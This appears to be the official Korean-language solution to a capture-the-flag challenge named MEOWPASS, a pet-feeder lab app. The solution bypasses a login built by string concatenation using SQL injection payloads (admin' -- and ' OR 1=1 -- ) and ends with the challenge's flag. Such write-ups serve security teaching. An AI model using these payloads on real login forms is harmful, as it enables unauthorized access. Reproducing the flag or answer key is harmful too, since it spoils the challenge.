# MEOWPASS 공식 풀이

## 1. 낮은 권한 화면 확인

의뢰문에 적힌 `guest / guest`로 로그인한다. 최근 이벤트 중 `#404`를 열면
목걸이 태그 `MP-C7:04:04`와 급식 내용은 보이지만, 연결된 반려동물 정보는
운영 권한이 필요하다는 메시지가 나온다.

## 2. 로그인 SQL Injection

서버는 폼 입력을 다음 SQL 문자열에 직접 연결한다.

```sql
SELECT id, username, role FROM accounts
WHERE username = '<username>' AND password = '<password>' LIMIT 1
```

관리자 암호 조건을 SQLite 주석으로 제거한다.

```text
username: admin' --
password: x
```

실행되는 쿼리는 다음 형태가 된다.

```sql
SELECT id, username, role FROM accounts
WHERE username = 'admin' -- ' AND password = 'x' LIMIT 1
```

따라서 암호를 알지 못해도 `admin` 행이 선택되고 운영자 세션이 생성된다.
`' OR 1=1 -- `도 관리자 행이 먼저 삽입되어 있으므로 동일하게 동작한다.

## 3. 의뢰 완료

운영자 권한으로 이벤트 `#404`를 다시 열면 다음 정보가 표시된다.

- 고양이 이름: `건공이`
- 보호자 계정: `NEXTDOOR_302`
- 원인: 인접 세대 태그가 공유 급식 그룹에 잘못 연결됨
- 사건 확인 코드: `SHA{wh0_ate_the_tuna_at_0404}`

CTFd에는 사건 확인 코드만 제출한다.
